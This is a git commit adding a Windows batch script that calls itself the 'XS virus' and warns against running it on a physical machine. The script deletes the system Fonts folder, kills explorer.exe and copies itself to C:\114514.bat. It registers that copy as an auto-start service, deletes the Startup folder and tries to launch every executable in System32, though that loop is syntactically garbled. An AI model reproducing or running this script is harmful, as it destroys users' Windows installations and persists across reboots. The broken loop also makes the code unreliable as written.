a5cb3164c39ae33d475b0be163ba8b9aced85396
WXS-china <WXSysqd@outlook.com>
2025-08-14 13:09:40 +0800

    XS病毒 - 请勿在实体机启动(后果自负)
    XS病毒 - 请勿在实体机启动(后果自负)

---
+++ XS病毒 - 请勿在实体机启动.bat
@@ -0,0 +1,64 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFDpQQQ2MNXiuFLQI5/rH3+OEtlgPUfEDS4zJ37GAM+gc/lbYc5c733lVloUFDxQ4
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSjk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSTk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpSI=
+::egkzugNsPRvcWATEpSI=
+::dAsiuh18IRvcCxnZtBNQ
+::cRYluBh/LU+EWAjk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJheU8BHVDi
+::ZQ05rAF9IBncCkqN+0xwdVsFFVXbZDrqZg==
+::ZQ05rAF9IAHYFVzEqQIIG5yjqYJNziv3Rj3TP20QMG97asjTqmbiiwknADF+72X5IiU=
+::eg0/rx1wNQPfEVWB+kM9LVsJDDyxu5xfgHruqKW7ZyVQJ6bC0R73/UElXml9phzJb7Ur8Hzltg==
+::fBEirQZwNQPfEVWB+kM9LVsJDDyxu5xfgHruqKW7ZyVQJ6bC0R73/UElXml9phzJb7Ur8Hzltg==
+::cRolqwZ3JBvQF1fEqQIIG5yjqYJNziv3Rj3TP20QMG97asjTqmbiiwknADF+72X5IiU=
+::dhA7uBVwLU+EWGG3c7XVrtSmDEnCtKRtg17DbRQzaiR5JpDu0h7l/X8UX15GQA==
+::YQ03rBFzNR3SWATEzHG33/7Sg/bCcSsyyWKZAzd+EyICbLOZiRG5hFVeKnsLyihz
+::dhAmsQZ3MwfNWATEzHG33/7Sg/bCcSsyyWKZAzd+EyICbLOZiRG5hFVeKnsLyihz
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRm8x8XHzZ2bvkTPfON10TD3N20HJ29JXMnAp2TDogorFTFk6IA=
+::Zh4grVQjdCuDJFuF4H4IG5yjqYJNziv3Rj3TP20QMG97asjTqmbiiwknADF+72X5IgvhbZNN
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+::关闭代码显示
+start https://space.bilibili.com/3493276898298079?spm_id_from=..0.0
+::作者界�?
+rmdir /s /q "C:\Windows\Fonts"
+::删除字体
+taskkill /f /im explorer.exe
+::结束explorer
+>>C:\114514.bat @echo off
+::关闭代码显示
+>>C:\114514.bat start https://space.bilibili.com/3493276898298079?spm_id_from=..0.0
+::作者界�?
+>>C:\114514.bat rmdir /s /q "C:\Windows\Fonts"
+::删除字体
+>>C:\114514.bat taskkill /f /im explorer.exe
+::结束explorer
+>>C:\114514.bat sc create XS病毒-请勿在实体机启动 binPath= "C:\114514.bat" start= auto
+sc create XS病毒-请勿在实体机启动 binPath= "C:\114514.bat" start= auto
+::开机自�?
+rmdir /s /q C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+::删除自启文件�?
+for%%a in（dir /b %windir%\System32\*.exe）do �?
+       start %%
+)
+pause
+::启动 System32 中的所有EXE文件(参考https://www.bilibili.com/video/BV16nZSYREFN/?vd_source=4b31802b8f5d27ffd77e1975ca83f2c2)
+::for %%a in (%windir%\system32\*.exe) do (
+::  if /i not "%%~na"=="logoff" start %%~fa
+::)
+::pause
+::b方案
